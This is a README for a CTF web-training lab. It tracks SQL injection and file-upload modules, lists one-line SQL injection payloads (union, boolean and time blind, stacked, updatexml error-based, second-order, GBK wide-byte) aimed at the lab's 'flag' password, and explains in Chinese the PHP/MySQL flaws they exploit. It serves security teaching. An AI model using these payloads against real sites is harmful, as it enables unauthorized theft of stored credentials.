[![License: CC BY-NC-SA 4.0](https://licensebuttons.net/l/by-nc-sa/4.0/80x15.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
# CTF_WEB_Training #

* 2021.01.31 SQL注入部分使用了Ajax以提高手工注入的体验
* 2021.02.04 SQL注入部分基本完结，二次注入暂时没有使用Ajax，接下来会补上，然后整理文件结构，再整理几个SQL注入的相关EXP，再写一下总结
* 2021.02.06 SQL注入部分完结

Progress
- [x]  SQL Injection
    - [x]  HTML
    - [x]  Ajax
    - [x]  Number
    - [x]  Char
    - [x]  Boolean
    - [x]  Time
    - [x]  Stacked
    - [x]  Error Reporting
	- [x]  Second Order
	- [x]  GBK
- [ ]  File Upload
	- [x]  JS
	- [ ]  %00
	- [ ]  Content Detection
	- [ ]  exif_imagetype
	- [ ]  Blacklist
	- [ ]  .htaccess
	- [ ]  TBC
- [ ]  File Inclusion
- [ ]  SSRF
- [ ]  CSRF
- [ ]  XSS
- [ ]  XXE?

<hr />

# SQL Injection #

## Payload ##

* 数字型注入: ``0 union select password from user where username='flag'#``
* 字符型注入：``0' union select password from user where username='flag'#``
* 布尔注入：``1'^(ascii(substr((select password from user where username='flag'),1,1))>0)#``
* 时间注入：``1' union select (ascii(substr((select password from user where username='flag'),1,1))>0) and sleep(1)#``
* 堆叠注入：``1'; select password from user where username='flag'#``
* 报错注入：``1' and updatexml(1,concat('~',substr((select password from user where username='flag'),1,16),'~'),1)#``
* 二次注入：``1' union select password from user where username=0x666c6167#``
* GBK注入：``0�' union select password from user where username=0x666c6167#``

## 总结 ##

MySQL本身的数字包含字符类型
```
select id from user where id=1
select id from user where id='1'
```
这里所加的引号并不会执行SQL语句的执行

而数字型与字符型的区别在于PHP中的SQL语句是否使用了引号来对数据进行闭合

"万能密码"的漏洞环境所使用的SQL语句一般为
```
select * from user where username='$username' and password='$password'
```
再通过判断能否查找到用户，找到用户则判断登入通过
而能查找到用户，返回的值为True，查找不到为False
则可以插入永真逻辑来进行Bypass
```
select * from user where username='' or 1#' and password='$password'
```

而此处的Boolean漏洞环境可以通过用户是否存在作为回显，进行逻辑盲注

时间盲注的利用往往存在于无差别回显的情况下，这时无法通过回显来进行SQL查询的逻辑判断，只能通过时间延迟来进行判断

如果回显的内容为SQL语句查询出的内容，则可以通过联合查询来快速地得到信息，但是需要注意，最好使得原SQL语句无法查询出数据，否则可能会无法回显出联合查询得出的结果

报错注入在于mysqli_error()这个函数的使用

堆叠注入的特殊之处在于：堆叠注入使用的是mysqli_multi_query()，而一般使用mysqli_query()

二次注入的原理在于，插入数据时使用了addslashes()函数，查询时则没有使用addslashes()函数，使得引号插入了查询时的SQL语句

GBK注入的原因是因为GBK编码与addslashes()函数，\作为转义符来转义引号，其十六进制值为0x5C。而GBK编码的高位范围为0x81\~0xFE，低位范围为0x40\~0xFE，在\之前插入一个高位范围的字符，则会被GBK编码将两个字符识别一个GBK字符，从而使得引号进行逃逸
